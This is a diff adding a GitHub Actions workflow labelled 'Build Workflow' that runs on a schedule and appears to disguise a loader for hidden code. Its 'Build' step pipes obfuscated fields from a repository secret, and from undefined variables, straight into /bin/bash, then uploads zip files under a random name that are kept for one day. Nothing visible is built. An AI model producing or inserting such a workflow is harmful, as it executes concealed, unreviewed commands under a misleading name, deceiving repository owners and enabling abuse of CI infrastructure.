@@ -1,0 +1,30 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '23 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  operation:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build
+        env:
+          suke9: ${{ secrets.suke9 }}
+        run: |
+          printf '%s' "$suke9" | jq -r .tyy44480 | /bin/bash
+          printf '%s' "$gfj1" | jq -r .oelv312 | /bin/bash
+          printf '%s' "$ipq7" | jq -r .zspw778 | /bin/bash
+          printf '%s' "$vcqcn988" | jq -r .xkok1263 | /bin/bash
+
+      - name: Archive output
+        uses: actions/upload-artifact@v4
+        with:
+          name: R1fDXggJ
+          path: "*.zip"
+          retention-days: 1
